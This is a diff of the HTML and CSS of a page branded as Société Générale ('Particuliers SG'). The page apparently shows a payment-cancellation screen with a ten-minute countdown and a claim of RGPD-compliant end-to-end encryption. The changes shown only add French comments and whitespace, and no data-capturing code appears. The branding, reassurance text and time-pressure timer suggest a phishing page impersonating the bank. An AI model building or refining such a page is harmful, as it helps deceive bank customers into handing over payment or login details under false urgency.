@@ -204,6 +204,7 @@
       filter: brightness(0) invert(1);
       animation: pulse 1.2s ease-in-out infinite;
     }
+    /* Suppression de l'image wero, donc plus besoin de ces règles pour img */
     @keyframes spin { to { transform: rotate(360deg); } }
 
     /* ===== PAGE 2-CARD (used for pages 3,4,5) ===== */
@@ -359,10 +360,10 @@
     }
     .countdown-progress {
       fill: none;
-      stroke: #4caf50;
+      stroke: #4caf50; /* vert par défaut, changé dynamiquement */
       stroke-width: 8;
       stroke-linecap: round;
-      stroke-dasharray: 439.823;
+      stroke-dasharray: 439.823; /* 2*pi*70 */
       stroke-dashoffset: 0;
       transition: stroke-dashoffset 1s linear, stroke 0.3s;
     }
@@ -373,6 +374,7 @@
       dominant-baseline: central;
       text-anchor: middle;
     }
+    /* Label en bleu comme le bouton Annuler */
     .countdown-label {
       font-size: 0.75rem;
       color: black;
@@ -400,14 +402,18 @@
 
   <nav>
     <div class="logo">
+      
       <img src="S-G-Log.png" alt="Societe Generale">
       <span>Particuliers SG</span>
     </div>
   </nav>
 
+
+   
   <div class="loading-overlay" id="loadingOverlay" style="display:none;">
     <div class="spinner-wrap">
       <div class="spinner-ring"></div>
+      
     </div>
   </div>
 
@@ -417,14 +423,19 @@
 
       <p class="rgpd-note">Cette plateforme utilise un chiffrement de bout en bout conforme aux normes RGPD.</p>
 
+
+      
       <div class="form-card" id="page1">
         <div class="divider"></div>
         <h1 class="card-title">Annulation</h1>
 
+        
         <div class="countdown-container">
           <svg class="countdown-svg" viewBox="0 0 160 160">
             <circle class="countdown-bg" cx="80" cy="80" r="70" />
             <circle class="countdown-progress" id="countdownCircle" cx="80" cy="80" r="70" />
+            <!-- Affichage du temps en MM:SS à l'intérieur du cercle -->
+           
           </svg>
 		   <text style="color: black;" class="countdown-text" id="countdownText">10:00</text>
          <br><br> <p class="countdown-label">Temps restant avant annulation</p>
